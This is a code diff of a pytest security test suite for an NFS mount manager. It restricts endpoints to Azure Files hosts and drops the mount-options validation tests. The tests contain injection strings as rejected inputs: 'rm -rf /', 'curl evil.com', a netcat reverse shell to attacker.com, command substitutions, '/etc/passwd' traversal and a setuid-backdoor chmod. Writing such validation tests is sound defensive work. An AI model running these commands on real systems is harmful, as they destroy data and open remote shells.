@@ -12,7 +12,6 @@ import pytest
 from azlin.modules.nfs_mount_manager import (
     NFSMountManager,
     ValidationError,
-    _validate_mount_options,
     _validate_mount_point,
     _validate_nfs_endpoint,
     _validate_storage_name,
@@ -102,35 +101,45 @@ class TestValidateNFSEndpoint:
         endpoint = "storageacct.file.core.windows.net:/share"
         assert _validate_nfs_endpoint(endpoint) == endpoint
 
-    def test_valid_nfs_endpoint_ip(self):
-        """Valid IP-based NFS endpoint should pass."""
-        endpoint = "10.0.0.4:/exports/data"
+    def test_valid_nfs_endpoint_azure_with_account_path(self):
+        """Valid Azure NFS endpoint with account path should pass."""
+        endpoint = "myaccount.file.core.windows.net:/myaccount/home"
         assert _validate_nfs_endpoint(endpoint) == endpoint
 
     def test_valid_nfs_endpoint_with_subdirs(self):
-        """Valid endpoint with subdirectories should pass."""
-        endpoint = "server.domain.com:/path/to/share"
+        """Valid Azure endpoint with subdirectories should pass."""
+        endpoint = "myaccount.file.core.windows.net:/myaccount/path/to/share"
         assert _validate_nfs_endpoint(endpoint) == endpoint
 
+    def test_reject_non_azure_host_ip(self):
+        """Should reject IP-based NFS endpoints (only Azure Files FQDNs allowed)."""
+        with pytest.raises(ValidationError, match="Azure Files FQDN"):
+            _validate_nfs_endpoint("10.0.0.4:/exports/data")
+
+    def test_reject_non_azure_host_generic(self):
+        """Should reject generic domain NFS endpoints."""
+        with pytest.raises(ValidationError, match="Azure Files FQDN"):
+            _validate_nfs_endpoint("server.domain.com:/path/to/share")
+
     def test_reject_command_injection_in_server(self):
-        """Should reject command injection in server part."""
-        with pytest.raises(ValidationError, match="unsafe character"):
+        """Should reject command injection in server part (caught by FQDN check)."""
+        with pytest.raises(ValidationError, match="Azure Files FQDN"):
             _validate_nfs_endpoint("server.com; rm -rf /:/share")
 
     def test_reject_command_injection_in_path(self):
         """Should reject command injection in path part."""
         with pytest.raises(ValidationError, match="unsafe character"):
-            _validate_nfs_endpoint("server.com:/share; curl evil.com")
+            _validate_nfs_endpoint("myaccount.file.core.windows.net:/share; curl evil.com")
 
     def test_reject_command_substitution(self):
         """Should reject command substitution."""
         with pytest.raises(ValidationError, match="unsafe character"):
-            _validate_nfs_endpoint("server.com:/share$(id)")
+            _validate_nfs_endpoint("myaccount.file.core.windows.net:/share$(id)")
 
     def test_reject_directory_traversal(self):
         """Should reject directory traversal in share path."""
         with pytest.raises(ValidationError, match="cannot contain"):
-            _validate_nfs_endpoint("server.com:/share/../etc/passwd")
+            _validate_nfs_endpoint("myaccount.file.core.windows.net:/share/../etc/passwd")
 
     def test_reject_missing_colon(self):
         """Should reject endpoint without colon separator."""
@@ -139,8 +148,8 @@ class TestValidateNFSEndpoint:
 
     def test_reject_missing_slash(self):
         """Should reject share path not starting with /."""
-        with pytest.raises(ValidationError, match="must start with '/'"):
-            _validate_nfs_endpoint("server.com:share")
+        with pytest.raises(ValidationError):
+            _validate_nfs_endpoint("myaccount.file.core.windows.net:share")
 
     def test_reject_empty_endpoint(self):
         """Should reject empty endpoint."""
@@ -148,43 +157,9 @@ class TestValidateNFSEndpoint:
             _validate_nfs_endpoint("")
 
     def test_reject_pipe_in_endpoint(self):
-        """Should reject pipe character."""
+        """Should reject pipe character in path."""
         with pytest.raises(ValidationError, match="unsafe character"):
-            _validate_nfs_endpoint("server.com:/share | nc attacker.com")
-
-
-class TestValidateMountOptions:
-    """Test mount options validation against injection attacks."""
-
-    def test_valid_mount_options(self):
-        """Valid mount options should pass."""
-        assert _validate_mount_options("sec=sys") == "sec=sys"
-        assert _validate_mount_options("rw,relatime") == "rw,relatime"
-        assert _validate_mount_options("sec=sys,rw,relatime") == "sec=sys,rw,relatime"
-
-    def test_empty_options(self):
-        """Empty options should be allowed."""
-        assert _validate_mount_options("") == ""
-
-    def test_reject_command_injection(self):
-        """Should reject command injection in options."""
-        with pytest.raises(ValidationError, match="invalid characters"):
-            _validate_mount_options("rw; rm -rf /")
-
-    def test_reject_space_injection(self):
-        """Should reject spaces (could separate commands)."""
-        with pytest.raises(ValidationError, match="invalid characters"):
-            _validate_mount_options("rw relatime")
-
-    def test_reject_quote_injection(self):
-        """Should reject quotes."""
-        with pytest.raises(ValidationError, match="invalid characters"):
-            _validate_mount_options("rw'exec'")
-
-    def test_reject_command_substitution(self):
-        """Should reject command substitution."""
-        with pytest.raises(ValidationError, match="invalid characters"):
-            _validate_mount_options("rw,$(whoami)")
+            _validate_nfs_endpoint("myaccount.file.core.windows.net:/share | nc attacker.com")
 
 
 class TestValidateStorageName:
@@ -258,7 +233,7 @@ class TestMountStorageSecurity:
         result = NFSMountManager.mount_storage(
             "1.2.3.4",
             Path("/fake/key"),
-            "server.com:/share",
+            "myaccount.file.core.windows.net:/myaccount/share",
         )
 
         # Commands should be executed
@@ -354,12 +329,6 @@ class TestAttackVectors:
         malicious_input = "server.com:/share; nc -e /bin/sh attacker.com 4444"
         with pytest.raises(ValidationError):
             _validate_nfs_endpoint(malicious_input)
-
-    def test_attack_vector_7_mount_options_injection(self):
-        """Attack Vector 7: Mount options with privilege escalation."""
-        malicious_input = "rw,exec; chmod 4755 /tmp/backdoor"
-        with pytest.raises(ValidationError):
-            _validate_mount_options(malicious_input)
 
 
 class TestValidationHelperExported:
